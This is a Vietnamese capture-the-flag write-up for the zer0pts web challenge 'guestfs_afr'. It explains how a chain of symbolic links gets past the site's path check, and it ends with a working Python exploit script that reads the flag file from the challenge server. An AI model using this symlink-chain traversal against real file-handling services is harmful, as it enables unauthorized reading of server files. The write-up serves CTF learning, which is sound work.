guestfs_afr
===
**Category:** Web

**Author:** ptr-yudai

### Description
- Source: `src.zip`

### Overview
- Một trang web mà chúng ta có thể tạo đọc và xóa file bao gồm symbolic links.
- Tên tệp chỉ được bắt đầu từ 0-9a-zA-Z
- Khi tạo symbolic link thì không được bắt đầu bằng `/` hoặc chứa `...`

### Solution
```php
/* Target file must exist */
            $this->assert_file_exists($this->root.$target);

            /* Create a symbolic link */
            @symlink($target, $this->root.$name);

            /* This check ensures $target points to inside user-space */
            try {
                $this->validate_filepath(@readlink($this->root.$name));
            } catch(Exception $e) {
                /* Revert changes */
                @unlink($this->root.$name);
                throw $e;
            }
```
- Ở đoạn code chương trình kiểm tra target path sau khi symblic được tạo. Điều này được sử dụng để xíu nữa bypass ở target symlink.
- Ý tưởng của bài này sẽ là tạo một symbolic link a->b->c sau đó unlink(c) và symlink("../../flag.txt","a"). Khi chúng ta symlink cho a với `../../flag.txt` thì a đang return về b nên vì vậy nó sẽ không check `..` và `\` hay có thể hiểu là đã bypass được đầu vào. Điều quan trọng là khi symlink cho a nhưng vì a chỉ có thể trỏ đến 1 file nên `../../flag.txt` được đẩy xuống dưới cùng.
- Mô tả: `a->b->c->../../flag.txt`

##### Payload
```py
import re
import requests

url = 'http://web.ctf.zer0pts.com:8001/'
sess = requests.Session()
sess.get(url)

# make a -> b -> c
sess.post(url, data={
  'name': 'c', 'type': '', 'mode': 'create', 'target': '.'
})
sess.post(url, data={
  'name': 'b', 'type': '', 'mode': 'create', 'target': 'c'
})
sess.post(url, data={
  'name': 'a', 'type': '', 'mode': 'create', 'target': 'b'
})

# delete c
sess.post(url, data={
  'name': 'c', 'mode': 'delete'
})

# make symlink('../../../../flag', 'a')
sess.post(url, data={
  'name': 'a', 'type': '', 'mode': 'create', 'target': '../../../../flag'
})

# :)
req = sess.post(url, data={
  'name': 'a', 'mode': 'read'
})
print(req.text)
```